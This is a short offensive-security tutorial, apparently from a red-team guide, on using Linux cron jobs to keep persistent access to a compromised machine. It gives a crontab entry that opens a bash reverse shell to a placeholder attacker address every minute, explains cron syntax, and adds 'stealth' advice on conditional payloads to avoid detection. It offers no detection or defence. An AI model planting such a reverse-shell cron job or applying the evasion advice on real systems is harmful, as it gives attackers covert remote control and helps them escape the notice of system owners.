Scheduling Access with Cron Jobs

Leveraging the Linux cron scheduler to execute commands at regular intervals.

# Example: Adding a reverse shell to crontab
# Open the current user's crontab for editing
crontab -e

# Add the following line to execute a reverse shell every minute
# This connects back to YOUR_IP on YOUR_PORT
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'

# Explanation of cron syntax:
# * * * * * command_to_execute
# | | | | |
# | | | | ----- Day of week (0-7, Sunday is 0 or 7)
# | | | ------- Month (1-12)
# | | --------- Day of month (1-31)
# | ----------- Hour (0-23)
# ------------- Minute (0-59)

How Cron Works

  • Cron is a daemon that runs in the background.
  • It reads configuration files (crontabs) to determine scheduled tasks.
  • Entries specify the time/frequency and the command to run.
  • Can be user-specific (`crontab -e`) or system-wide (`/etc/cron.d/`).

Stealth Considerations

While effective, frequent cron jobs can be noisy. Consider scheduling scripts that check for specific conditions before executing a payload to reduce detection risk.

Key Takeaway

Cron jobs offer a powerful, automated way to maintain persistence on Linux, but require careful planning to avoid detection.
